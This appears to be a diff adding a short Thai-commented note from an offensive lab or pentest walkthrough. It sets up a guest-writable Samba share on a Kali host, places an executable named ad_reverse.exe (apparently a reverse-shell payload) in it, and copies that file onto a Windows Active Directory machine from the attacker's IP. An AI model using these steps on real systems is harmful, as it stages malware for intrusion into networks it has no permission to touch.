@@ -1,0 +1,20 @@
+**Kali**
+sudo apt install samba
+
+#สร้างโฟลเดอร์แชร์
+mkdir /srv/smbshare
+cp /home/kali/ad_reverse.exe /srv/smbshare
+
+#แก้ไข /etc/samba/smb.conf เพิ่มไว้ท้ายไฟล์
+[smbshare]
+   path = /srv/smbshare
+   read only = no
+   browsable = yes
+   guest ok = yes
+
+#รีสตาร์ท Samba
+sudo systemctl restart smbd
+
+**Windows AD**
+net use Z: \\<KALI_PUBLIC_IP>\smbshare
+copy Z:\ad_reverse.exe C:\Users\Public\
